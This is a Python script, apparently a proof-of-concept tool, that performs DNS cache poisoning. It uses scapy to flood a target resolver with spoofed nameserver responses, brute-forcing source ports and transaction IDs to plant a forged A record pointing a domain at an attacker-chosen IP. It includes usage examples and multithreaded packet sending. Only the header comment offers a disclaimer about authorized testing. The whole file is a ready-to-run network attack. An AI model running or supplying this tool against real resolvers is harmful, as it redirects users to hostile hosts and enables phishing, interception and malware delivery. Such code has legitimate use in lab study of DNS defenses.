#!/usr/bin/env python3
"""
Multi-threaded DNS Cache Poisoning PoC
Author: [Your Name or Handle]
License: For educational and authorized security testing ONLY!

Usage Example:

  python3 dns_poison.py \
    --target-resolver 192.168.1.10 \
    --fake-ns-ip 8.8.8.8 \
    --domain mytest.domain.com \
    --malicious-ip 1.2.3.4 \
    --port-start 50000 \
    --port-end 50100 \
    --attempts-per-port 500 \
    --threads 10 \
    --packets-per-log 100

Or all in one line:

  python3 dns_poison.py --target-resolver 192.168.1.10 --fake-ns-ip 8.8.8.8 --domain mytest.domain.com --malicious-ip 1.2.3.4 --port-start 50000 --port-end 50100 --attempts-per-port 500 --threads 10 --packets-per-log 100

Description:
  Attempts to brute force DNS source-port + TxID to inject a forged A record for
  'domain' into the cache of 'target-resolver', pretending to be 'fake-ns-ip'.
  If successful, queries to the resolver for 'domain' will return 'malicious-ip'.
  Modern DNS servers with proper randomization are typically resistant, but this
  script demonstrates the concept of cache poisoning in a lab or against older/less
  secure configurations.

Disclaimer:
  - Sending thousands of forged DNS packets is noisy and may trigger IDS/IPS alerts.
  - You must have explicit permission to test the target DNS server.
  - We provide no warranties; use at your own risk for lawful security assessments.
"""

import random
import threading
import queue
from scapy.all import IP, UDP, DNS, DNSQR, DNSRR, send
import argparse
import time

def worker_task(
    job_queue: queue.Queue,
    target_resolver: str,
    fake_ns_ip: str,
    domain: str,
    malicious_ip: str,
    attempts_per_port: int,
    thread_id: int,
    packets_per_log: int
):
    """
    Each worker thread pulls ports from the job queue, then sends multiple
    forged DNS responses for each port, randomizing the DNS TxID.
    """
    while True:
        try:
            port = job_queue.get_nowait()
        except queue.Empty:
            break  # No more ports to process

        print(f"[Thread-{thread_id}] Starting port {port}")
        count_sent = 0
        start_time = time.time()

        for _ in range(attempts_per_port):
            tx_id_guess = random.randint(0, 65535)
            dns_resp = (
                IP(dst=target_resolver, src=fake_ns_ip) /
                UDP(dport=port, sport=53) /
                DNS(
                    id=tx_id_guess,
                    qr=1,  # Response
                    aa=1,  # Authoritative
                    rd=1,
                    qdcount=1,
                    ancount=1,
                    qd=DNSQR(qname=domain, qtype="A"),
                    an=DNSRR(rrname=domain, rdata=malicious_ip, ttl=300),
                )
            )
            # Send packet without scapy verbosity to improve speed
            send(dns_resp, verbose=0)
            count_sent += 1

            # Periodic log
            if count_sent % packets_per_log == 0:
                elapsed = time.time() - start_time
                print(f"[Thread-{thread_id}] Port {port}: Sent {count_sent} packets ({elapsed:.1f}s elapsed)")

        print(f"[Thread-{thread_id}] Finished port {port}, total {count_sent} packets.")
        job_queue.task_done()

def main():
    parser = argparse.ArgumentParser(
        description="Multi-threaded DNS Cache Poisoning PoC"
    )
    parser.add_argument("--target-resolver", required=True,
                        help="IP of the DNS resolver to poison (e.g. 192.168.1.10)")
    parser.add_argument("--fake-ns-ip", default="8.8.8.8",
                        help="Spoofed NS IP address (default=8.8.8.8)")
    parser.add_argument("--domain", default="test.yourdomain.com",
                        help="Domain to poison (default=test.yourdomain.com)")
    parser.add_argument("--malicious-ip", default="1.2.3.4",
                        help="IP to inject into the resolver's cache (default=1.2.3.4)")
    parser.add_argument("--port-start", type=int, default=50000,
                        help="Start of port range to brute force (default=50000)")
    parser.add_argument("--port-end", type=int, default=50100,
                        help="End of port range to brute force (default=50100)")
    parser.add_argument("--attempts-per-port", type=int, default=500,
                        help="Number of TxID attempts per port (default=500)")
    parser.add_argument("--threads", type=int, default=5,
                        help="Number of parallel worker threads (default=5)")
    parser.add_argument("--packets-per-log", type=int, default=100,
                        help="Print a status update every N packets (default=100)")

    args = parser.parse_args()

    port_range = range(args.port_start, args.port_end + 1)
    total_ports = len(list(port_range))

    print(f"[+] Target Resolver : {args.target_resolver}")
    print(f"[+] Fake NS IP      : {args.fake_ns_ip}")
    print(f"[+] Domain          : {args.domain}")
    print(f"[+] Malicious IP    : {args.malicious_ip}")
    print(f"[+] Port Range      : {args.port_start} - {args.port_end} ({total_ports} ports)")
    print(f"[+] Attempts/Port   : {args.attempts_per_port}")
    print(f"[+] Threads         : {args.threads}")
    print(f"[+] Packets/Log     : {args.packets_per_log}")
    print("[*] Press Ctrl+C to stop early. Starting...")

    # Create a queue of all the ports we want to brute force
    job_queue = queue.Queue()
    for p in port_range:
        job_queue.put(p)

    threads = []
    for thread_id in range(1, args.threads + 1):
        t = threading.Thread(
            target=worker_task,
            args=(
                job_queue,
                args.target_resolver,
                args.fake_ns_ip,
                args.domain,
                args.malicious_ip,
                args.attempts_per_port,
                thread_id,
                args.packets_per_log
            ),
            daemon=True
        )
        t.start()
        threads.append(t)

    # Wait for all ports to be processed
    job_queue.join()

    print("[*] All ports processed. Finished sending packets.")
    print("[*] Check the DNS cache of the resolver to see if it was poisoned.")

if __name__ == "__main__":
    main()
